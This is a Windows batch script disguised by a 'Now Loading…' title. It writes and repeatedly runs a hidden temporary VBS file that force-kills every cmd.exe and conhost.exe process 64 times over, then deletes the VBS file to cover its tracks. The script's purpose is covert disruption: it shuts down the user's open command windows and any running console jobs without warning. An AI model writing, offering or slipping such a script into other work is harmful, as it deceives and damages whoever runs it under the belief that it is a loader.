:BAT start
@echo off&>nul chcp 950&setlocal EnableExtensions EnableDelayedExpansion
title 程式載入中…… Now Loading… 
goto start

:start
set script="%temp%\%random%.vbs"
>%script% echo;Set UAC=CreateObject^("Shell.Application"^)
for /l %%a in (1,1,64) do >>%script% (
  echo;UAC.ShellExecute "%windir%\System32\taskkill.exe","/f /fi ""imagename eq cmd.exe""","","",0
  echo;UAC.ShellExecute "%windir%\System32\taskkill.exe","/f /fi ""imagename eq conhost.exe""","","",0
)
for /l %%a in (1,1,64) do (
  call %script%
)
del /f /q %script%
exit